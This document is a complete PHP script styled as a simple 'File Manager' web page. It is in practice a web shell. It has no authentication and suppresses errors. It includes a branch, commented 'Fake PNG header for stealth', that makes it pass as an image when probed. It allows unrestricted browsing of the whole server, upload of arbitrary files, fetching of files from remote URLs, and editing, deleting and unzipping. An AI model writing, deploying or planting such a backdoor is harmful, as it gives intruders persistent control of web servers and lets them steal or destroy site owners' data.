<?php
// Fake PNG header for stealth
if (isset($_GET['i'])) {
    header('Content-Type: image/png');
    echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
    exit;
}

// Start session and error handling
session_start();
error_reporting(0);

// Format bytes helper
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

// Get permissions helper
function getPerms($file) {
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

// Recursive delete helper
function deleteRecursive($path) {
    if (is_file($path) || is_link($path)) {
        return unlink($path);
    }
    $files = array_diff(scandir($path), ['.', '..']);
    foreach ($files as $file) {
        if (!deleteRecursive($path . DIRECTORY_SEPARATOR . $file)) return false;
    }
    return rmdir($path);
}

// Get current directory from GET param or default to current folder
if (isset($_GET['dir'])) {
    $current_dir = realpath($_GET['dir']);
    if ($current_dir === false) {
        $current_dir = realpath('.');
    }
} else {
    $current_dir = realpath('.');
}

// Security note: This file manager allows full directory access (as requested)

// Messages
$message = '';
$message_type = '';

// Handle file upload (single)
if (isset($_FILES['file'])) {
    $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        $message = 'File uploaded successfully';
        $message_type = 'success';
    } else {
        $message = 'File upload failed';
        $message_type = 'error';
    }
}

// Handle file upload (multiple)
if (isset($_FILES['files'])) {
    $upload_count = 0;
    foreach ($_FILES['files']['name'] as $i => $name) {
        if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
            $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($name);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target_path)) {
                $upload_count++;
            }
        }
    }
    if ($upload_count > 0) {
        $message = "Uploaded $upload_count file(s) successfully";
        $message_type = 'success';
    } else {
        $message = 'Multiple file upload failed';
        $message_type = 'error';
    }
}

// Handle URL file download
if (isset($_POST['url_upload']) && !empty($_POST['url_path'])) {
    $url = $_POST['url_path'];
    $file_name = basename($url);
    $file_content = @file_get_contents($url);
    if ($file_content !== false) {
        if (file_put_contents($current_dir . DIRECTORY_SEPARATOR . $file_name, $file_content)) {
            $message = 'File downloaded from URL successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to save file from URL';
            $message_type = 'error';
        }
    } else {
        $message = 'Failed to download file from URL';
        $message_type = 'error';
    }
}

// Create new directory
if (isset($_POST['new_dir']) && !empty($_POST['dir_name'])) {
    $new_dir = $current_dir . DIRECTORY_SEPARATOR . $_POST['dir_name'];
    if (!file_exists($new_dir)) {
        if (mkdir($new_dir)) {
            $message = 'Directory created successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to create directory';
            $message_type = 'error';
        }
    } else {
        $message = 'Directory already exists';
        $message_type = 'error';
    }
}

// Delete file or directory
if (isset($_GET['delete'])) {
    $delete_path = $current_dir . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (file_exists($delete_path)) {
        if (deleteRecursive($delete_path)) {
            $message = 'Deleted successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to delete';
            $message_type = 'error';
        }
    }
}

// Rename file or directory
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old_path = $current_dir . DIRECTORY_SEPARATOR . $_POST['old_name'];
    $new_path = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if (file_exists($old_path) && !file_exists($new_path)) {
        if (rename($old_path, $new_path)) {
            $message = 'Renamed successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to rename';
            $message_type = 'error';
        }
    } else {
        $message = 'File not found or new name already exists';
        $message_type = 'error';
    }
}

// Save edited file (from CodeMirror editor)
if (isset($_POST['save']) && isset($_POST['file_path']) && isset($_POST['content'])) {
    $file_path = $_POST['file_path'];
    if (file_exists($file_path) && is_writable($file_path)) {
        if (file_put_contents($file_path, $_POST['content'])) {
            $message = 'File saved successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to save file';
            $message_type = 'error';
        }
    } else {
        $message = 'File not writable or does not exist';
        $message_type = 'error';
    }
}

// Download file
if (isset($_GET['download'])) {
    $file_path = $current_dir . DIRECTORY_SEPARATOR . $_GET['download'];
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

// Unzip file
if (isset($_GET['unzip'])) {
    $file_path = $current_dir . DIRECTORY_SEPARATOR . $_GET['unzip'];
    if (file_exists($file_path) && is_file($file_path) && strtolower(pathinfo($file_path, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($file_path) === true) {
            $zip->extractTo($current_dir);
            $zip->close();
            $message = 'File unzipped successfully';
            $message_type = 'success';
        } else {
            $message = 'Failed to unzip file';
            $message_type = 'error';
        }
    }
}

// Get directory contents
$files = [];
$dirs = [];
if (is_dir($current_dir)) {
    $items = scandir($current_dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $current_dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $dirs[] = [
                'name' => $item,
                'path' => $path,
                'size' => '-',
                'perms' => getPerms($path),
                'is_dir' => true,
                'mtime' => filemtime($path),
            ];
        } else {
            $files[] = [
                'name' => $item,
                'path' => $path,
                'size' => formatSize(filesize($path)),
                'perms' => getPerms($path),
                'is_dir' => false,
                'mtime' => filemtime($path),
            ];
        }
    }
}

// Sort arrays by 'name' or 'size' or 'perms'
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) ? $_GET['order'] : 'asc';

usort($dirs, function ($a, $b) use ($sort, $order) {
    return $order === 'asc' ? strcmp($a[$sort], $b[$sort]) : strcmp($b[$sort], $a[$sort]);
});

usort($files, function ($a, $b) use ($sort, $order) {
    if ($sort === 'size') {
        return $order === 'asc' ? filesize($a['path']) - filesize($b['path']) : filesize($b['path']) - filesize($a['path']);
    }
    return $order === 'asc' ? strcmp($a[$sort], $b[$sort]) : strcmp($b[$sort], $a[$sort]);
});

// Handle file content preview for edit (via AJAX)
if (isset($_GET['preview'])) {
    $file_path = $_GET['preview'];
    if (file_exists($file_path) && is_file($file_path) && is_readable($file_path)) {
        header('Content-Type: text/plain');
        readfile($file_path);
        exit;
    }
}

// Helper for breadcrumb
function breadcrumbLinks($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $links = [];
    $accum = '';
    foreach ($parts as $part) {
        $accum .= DIRECTORY_SEPARATOR . $part;
        $links[] = ['name' => $part, 'path' => $accum];
    }
    return $links;
}

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>File Manager</title>
<style>
    * { box-sizing: border-box; }
    body { font-family: Arial, sans-serif; margin:0; padding:20px; background:#f5f5f5; color:#333; }
    .container { max-width:1200px; margin:auto; background:#fff; padding:20px; border-radius:5px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }
    h1 { margin-top:0; color:#444; }
    .breadcrumb { padding:10px 0; margin-bottom:20px; border-bottom:1px solid #eee; font-size: 14px;}
    .breadcrumb a { color:#007bff; text-decoration:none; }
    .breadcrumb a:hover { text-decoration: underline; }
    .message { padding:10px; margin-bottom:20px; border-radius:4px; }
    .success { background:#d4edda; color:#155724; border:1px solid #c3e6cb; }
    .error { background:#f8d7da; color:#721c24; border:1px solid #f5c6cb; }
    table { width:100%; border-collapse: collapse; margin-bottom: 20px;}
    th, td { padding:12px 15px; text-align:left; border-bottom:1px solid #ddd; vertical-align: middle; }
    th { background:#f8f9fa; cursor:pointer; user-select:none; }
    th:hover { background:#e9ecef; }
    tr:hover { background:#f5f5f5; }
    .actions a { margin-right: 10px; color:#007bff; text-decoration:none; font-size: 14px;}
    .actions a:hover { text-decoration: underline; }
    .form-group { margin-bottom: 15px; }
    .form-group label { display:block; margin-bottom:5px; font-weight:bold; }
    .form-group input, .form-group textarea { width: 100%; padding:8px; border:1px solid #ddd; border-radius:4px; font-family: monospace; font-size: 14px;}
    .form-group textarea { min-height: 200px; font-family: monospace; }
    button, .btn { background:#007bff; color:#fff; border:none; padding:8px 15px; border-radius:4px; cursor:pointer; text-decoration:none; display:inline-block; font-size: 14px;}
    button:hover, .btn:hover { background:#0069d9; }
    .btn-danger { background:#dc3545; }
    .btn-danger:hover { background:#c82333; }
    .btn-success { background:#28a745; }
    .btn-success:hover { background:#218838; }
    .upload-methods { margin-bottom: 20px; }
    .tab-content { display:none; padding:15px; background:#f8f9fa; border-radius: 0 0 5px 5px; margin-bottom:20px; }
    .tab-content.active { display:block; }
    .tab-links { display:flex; border-bottom:1px solid #ddd; margin-bottom: 10px; }
    .tab-link { padding:10px 15px; cursor:pointer; background:#f1f1f1; border:none; margin-right:5px; border-radius: 4px 4px 0 0; font-weight: 600; font-size: 14px; user-select:none;}
    .tab-link.active { background:#f8f9fa; border-bottom: 2px solid #007bff; color:#007bff;}
    .tab-link:hover:not(.active) { background:#ddd; }
    @media (max-width: 768px) {
        th, td { padding:8px 10px; font-size: 12px;}
        .actions a { display:block; margin-bottom:5px; font-size: 12px;}
        .tab-links { flex-wrap: wrap; }
        .tab-link { flex: 1 1 45%; margin-bottom: 5px; text-align: center;}
    }
    .perm-ok { color: blue; font-weight: 700; }
    .perm-no { color: red; font-weight: 700; }
</style>

<!-- CodeMirror -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/python/python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/markdown/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/shell/shell.min.js"></script>
</head>
<body>
<div class="container">
    <h1>File Manager</h1>
    
    <div class="breadcrumb" style="font-size:14px;">
        <a href="?dir=<?= urlencode(DIRECTORY_SEPARATOR) ?>">Root</a> /
        <?php 
        $crumbs = breadcrumbLinks($current_dir);
        foreach ($crumbs as $i => $crumb) {
            $is_last = ($i === count($crumbs) -1);
            echo '<a href="?dir=' . urlencode($crumb['path']) . '">' . htmlspecialchars($crumb['name']) . '</a>';
            if (!$is_last) echo ' / ';
        }
        ?>
    </div>

    <?php if ($message): ?>
        <div class="message <?= htmlspecialchars($message_type) ?>"><?= htmlspecialchars($message) ?></div>
    <?php endif; ?>
    
    <div class="upload-methods">
        <button onclick="toggleTab('upload1')" class="tab-link active" id="tabupload1">Upload File</button>
        <button onclick="toggleTab('upload2')" class="tab-link" id="tabupload2">Upload Multiple</button>
        <button onclick="toggleTab('upload3')" class="tab-link" id="tabupload3">From URL</button>
        <button onclick="toggleTab('upload4')" class="tab-link" id="tabupload4">Create Folder</button>
    </div>
    
    <div id="upload1" class="tab-content active">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
    </div>
    <div id="upload2" class="tab-content">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple required>
            <button type="submit">Upload Multiple</button>
        </form>
    </div>
    <div id="upload3" class="tab-content">
        <form method="post">
            <input type="text" name="url_path" placeholder="Enter file URL" style="width: 80%" required>
            <button type="submit" name="url_upload">Download from URL</button>
        </form>
    </div>
    <div id="upload4" class="tab-content">
        <form method="post">
            <input type="text" name="dir_name" placeholder="New folder name" required>
            <button type="submit" name="new_dir">Create Folder</button>
        </form>
    </div>

    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($dirs as $dir): ?>
            <tr>
                <td>📁 <a href="?dir=<?= urlencode($dir['path']) ?>"><?= htmlspecialchars($dir['name']) ?></a></td>
                <td><?= $dir['size'] ?></td>
                <td class="<?= is_writable($dir['path']) ? 'perm-ok' : 'perm-no' ?>"><?= $dir['perms'] ?></td>
                <td class="actions">
                    <a href="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($dir['name']) ?>" onclick="return confirm('Delete folder <?= htmlspecialchars($dir['name']) ?>?');" class="btn-danger">Delete</a>
                    <a href="#" onclick="renameItem('<?= htmlspecialchars(addslashes($dir['name'])) ?>');return false;">Rename</a>
                </td>
            </tr>
        <?php endforeach; ?>

        <?php foreach ($files as $file): ?>
            <tr>
                <td>📄 <?= htmlspecialchars($file['name']) ?></td>
                <td><?= $file['size'] ?></td>
                <td class="<?= is_writable($file['path']) ? 'perm-ok' : 'perm-no' ?>"><?= $file['perms'] ?></td>
                <td class="actions">
                    <a href="?dir=<?= urlencode($current_dir) ?>&download=<?= urlencode($file['name']) ?>">Download</a>
                    <a href="?dir=<?= urlencode($current_dir) ?>&edit=<?= urlencode($file['name']) ?>">Edit</a>
                    <?php if (strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)) === 'zip'): ?>
                        | <a href="?dir=<?= urlencode($current_dir) ?>&unzip=<?= urlencode($file['name']) ?>" onclick="return confirm('Unzip <?= htmlspecialchars($file['name']) ?>?');">Unzip</a>
                    <?php endif; ?>
                    | <a href="#" onclick="renameItem('<?= htmlspecialchars(addslashes($file['name'])) ?>');return false;">Rename</a>
                    | <a href="?dir=<?= urlencode($current_dir) ?>&delete=<?= urlencode($file['name']) ?>" onclick="return confirm('Delete file <?= htmlspecialchars($file['name']) ?>?');" class="btn-danger">Delete</a>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>

<?php
// EDIT FILE SECTION with CodeMirror smart editor
if (isset($_GET['edit'])):
    $edit_file = $current_dir . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (file_exists($edit_file) && is_file($edit_file) && is_readable($edit_file)):
        $content = htmlspecialchars(file_get_contents($edit_file));
        $filename = htmlspecialchars($_GET['edit']);
        $ext = strtolower(pathinfo($edit_file, PATHINFO_EXTENSION));

        // Map extensions to CodeMirror modes (add more if needed)
        $modes = [
            'js' => 'javascript',
            'json' => 'javascript',
            'php' => 'php',
            'html' => 'htmlmixed',
            'htm' => 'htmlmixed',
            'css' => 'css',
            'xml' => 'xml',
            'py' => 'python',
            'java' => 'clike',
            'c' => 'clike',
            'cpp' => 'clike',
            'md' => 'markdown',
            'sh' => 'shell',
            'txt' => 'null',  // plain text
            'log' => 'null',
            'ini' => 'null',
        ];
        $mode = isset($modes[$ext]) ? $modes[$ext] : 'null';
        ?>
        <hr>
        <h2>Editing: <?= $filename ?></h2>
        <form method="post">
            <input type="hidden" name="file_path" value="<?= htmlspecialchars($edit_file) ?>">
            <textarea id="code" name="content"><?= $content ?></textarea><br>
            <button type="submit" name="save" class="btn btn-success">Save</button>
            <a href="?dir=<?= urlencode($current_dir) ?>" class="btn btn-secondary">Cancel</a>
        </form>

        <script>
            var editor = CodeMirror.fromTextArea(document.getElementById('code'), {
                lineNumbers: true,
                mode: '<?= $mode ?>',
                theme: 'default',
                lineWrapping: true,
                autofocus: true,
                tabSize: 4,
                indentUnit: 4,
                matchBrackets: true,
            });
            // Resize editor height on window resize
            function resizeEditor() {
                var height = window.innerHeight * 0.7;
                editor.setSize(null, height);
            }
            window.addEventListener('resize', resizeEditor);
            resizeEditor();
        </script>
        <?php
    else:
        echo '<p><strong>Cannot edit this file or file does not exist.</strong></p>';
    endif;
endif;
?>

</div>

<script>
function toggleTab(id) {
    var tabs = document.querySelectorAll('.tab-content');
    var links = document.querySelectorAll('.tab-link');
    tabs.forEach(t => t.classList.remove('active'));
    links.forEach(l => l.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    document.getElementById('tab' + id).classList.add('active');
}

function renameItem(oldName) {
    var newName = prompt("Enter new name for: " + oldName);
    if (newName && newName !== oldName) {
        // Create a hidden form and submit
        var form = document.createElement('form');
        form.method = 'post';
        form.style.display = 'none';

        var inputRename = document.createElement('input');
        inputRename.name = 'rename';
        inputRename.value = '1';
        form.appendChild(inputRename);

        var inputOld = document.createElement('input');
        inputOld.name = 'old_name';
        inputOld.value = oldName;
        form.appendChild(inputOld);

        var inputNew = document.createElement('input');
        inputNew.name = 'new_name';
        inputNew.value = newName;
        form.appendChild(inputNew);

        document.body.appendChild(form);
        form.submit();
    }
}
</script>

</body>
</html>
